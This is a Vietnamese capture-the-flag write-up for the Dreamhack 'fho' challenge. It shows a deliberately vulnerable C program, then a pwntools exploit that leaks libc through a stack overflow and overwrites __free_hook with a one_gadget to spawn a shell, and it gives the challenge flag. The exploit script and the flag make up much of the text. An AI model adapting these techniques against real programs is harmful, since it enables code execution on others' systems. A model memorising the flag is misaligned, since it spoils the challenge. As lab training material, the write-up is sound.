# fho

1 chall tương tự như bài Hook

**source C:**

```c 
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}

```

**checks:**


![image](https://github.com/gookoosss/CTF/assets/128712571/11f4ab99-d11a-48b8-8eb9-b98420d5f560)



**tại lần nhập 1 có lỗi BOF nên ta có thể lợi dụng để leak libc** vì trong bài này không có hàm tạo shell cho mình

```python
payload = b'a'*72
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

libc_leak = u64(p.recvuntil(b'\n',drop=True) + b'\0\0')
libc.address = libc_leak - 0x21bf7

log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

```

oke sau khi có được libc rồi thì ta sẽ khai thác lần nhập 2 và 3

**lần nhập 2 thì ta phải nhập vào 1 địa chỉ cho con trỏ, lần nhập 3 sẽ là gán giá trị cho con trỏ đó**

hmm tới đây mình nảy ra ý tưởng là **trong main ta có sẵn hàm free rồi, nếu vậy ta sẽ kết hợp dùng __free_hook và one_gadget để có thể lấy shell ngay trong hàm free**

oke giờ ta chạy thử xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/39e36c52-aff9-4760-a192-8b0f88ddee77)


đúng như ta dự đoán thì lúc này **rax đang chứa __free_hook và đang trỏ đến địa chỉ của one_gadget** 

giờ ta chạy đến lần nhập 4 xem sao 

lần nhập 4 yêu cầu là 1 địa chỉ nên ta thử nhập địa chỉ libc thử xem chương trình chạy như thế nào

![image](https://github.com/gookoosss/CTF/assets/128712571/f13d4f29-b71a-4974-999c-3126e782363d)


à mình hiểu rồi, **như trên ảnh thì libc mình nhập đại vào lần nhập 4 sẽ được vào gán rdi**, vậy cái này sẽ có tác dụng khi **ta sử dụng libc.sym['system'] ở lần nhập 3, và lần nhập 4 ta sẽ nhập next(libc.search(b'/bin/sh'))** để gán /bin/sh vào rdi là có thể lấy shell rồi

**ở đây mình dùng one_gadget nên lần nhập 4 ko quan trọng nên mình nhập đại** 


## script:


```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
p = process([exe.path])
# p = remote("host3.dreamhack.games", 10433)
        
gdb.attach(p, gdbscript = '''
b*main+129
b*main+206
c           
''')

input()

payload = b'a'*72
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)

libc_leak = u64(p.recvuntil(b'\n',drop=True) + b'\0\0')
libc.address = libc_leak - 0x21bf7

log.info('libc leak: ' + hex(libc_leak))
log.info('libc base: ' + hex(libc.address))

one_gadget = libc.address + 0x4f432

p.sendlineafter(b'To write: ', str(libc.sym['__free_hook']))
p.sendlineafter(b'With: ', str(one_gadget))
p.sendlineafter(b'To free: ', str(libc.sym['__free_hook']))

p.interactive()

# DH{a8529ace5e50480658a645aa1a1c88291784335c1c54c5b89d0f43ad1893730c}

```

## Flag:

**DH{a8529ace5e50480658a645aa1a1c88291784335c1c54c5b89d0f43ad1893730c}**







